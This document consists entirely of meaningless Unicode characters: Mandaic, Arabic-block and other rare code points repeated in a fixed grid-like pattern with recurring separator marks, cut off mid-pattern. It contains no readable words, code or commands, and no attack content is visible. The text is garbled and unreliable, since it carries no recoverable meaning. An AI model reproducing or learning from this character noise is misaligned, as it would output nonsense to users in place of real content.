࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛